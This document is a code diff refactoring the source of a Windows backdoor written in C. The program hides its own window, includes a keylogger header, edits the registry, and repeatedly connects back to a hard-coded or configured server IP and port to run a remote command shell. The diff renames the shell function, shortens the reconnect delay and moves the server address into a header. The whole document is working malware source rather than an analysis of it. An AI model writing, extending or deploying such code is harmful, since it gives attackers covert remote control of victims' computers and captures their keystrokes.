@@ -1,6 +1,4 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include "libs/common.h"
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <winsock2.h>
@@ -10,31 +8,11 @@
 #include <windowsx.h>
 #include "libs/keylogger.h"
 
-/**
- * The bzero() function erases the data in the n bytes of the memory
-   starting at the location pointed to by s, by writing zeros (bytes
-   containing '\0') to that area.
-**/
-// port bzero in linux for windows (for ease of use)
-#define bzeroWin(p, size) (void)memset((p), 0, (size))
-
-//=====================================================================================//
-
-/**
- * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of
-   other functions to identify the correct program and instance when passing
-   commands or requesting data.
-   
- * hPrev: used in 16bit windows, now 0
-   lpCmdLine: contains command line arguments
-   nCmdShow: flag for main application window state (minimized, maximized or normal)
-***/
-
 //====== Global Variables =======//
 int sock;
 struct sockaddr_in ServAddr;
 
-void Cmd();
+void Shell();
 
 //============ Check & Close Socket on Server Disconnect ============//
 boolean connected(SOCKET sock) {
@@ -57,10 +35,10 @@ void reconnect() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
     while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0) {
-        Sleep(30000); // 30 sec
+        Sleep(10000); // 30 sec
     }
 
-    Cmd();
+    Shell();
 }
 
 //============ Cut a string between given indexes  ============//
@@ -150,20 +128,20 @@ int editRegistry() {
 }
 
 //============ Shell ============//
-void Cmd() {
+void Shell() {
     char buffer[1024];
     char container[1024];
     char total_response[18384];
 
     while (connected(sock)) {
-        bzeroWin(buffer, 1024);
-        bzeroWin(container, sizeof(container));
-        bzeroWin(total_response, sizeof(total_response));
+        bzero(buffer, 1024);
+        bzero(container, sizeof(container));
+        bzero(total_response, sizeof(total_response));
         // receive variables
         recv(sock, buffer, 1024, 0);
 
-        // q - quit the connection
-        if (strncmp("q", buffer, 1) == 0) {
+        // quit - quit the connection
+        if (strncmp("quit", buffer, 4) == 0) {
             closesocket(sock);
             WSACleanup();
             exit(0);
@@ -191,7 +169,18 @@ void Cmd() {
     reconnect();
 }
 
-//============ Main ============//
+//======================= Main =======================//
+
+/**
+ * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of
+   other functions to identify the correct program and instance when passing
+   commands or requesting data.
+   
+ * hPrev: used in 16bit windows, now 0
+   lpCmdLine: contains command line arguments
+   nCmdShow: flag for main application window state (minimized, maximized or normal)
+***/
+
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     // hide the window
     HWND stealth;
@@ -200,12 +189,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     ShowWindow(stealth, 0);
 
     // setup socket for connection
-    unsigned short ServPort;
-    char *ServIP;
     WSADATA wsaData;
-
-    ServIP = "192.168.43.31";
-    ServPort = 50005;
 
     /**
      * The WSAStartup function must be the first Windows Sockets function called by an application or DLL.
@@ -221,8 +205,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     memset(&ServAddr, 0, sizeof(ServAddr));
     // define params for ServAddr variable
     ServAddr.sin_family = AF_INET;
-    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
-    ServAddr.sin_port = htons(ServPort);
+    ServAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+    ServAddr.sin_port = htons(SERVER_PORT);
 
     reconnect();
 }
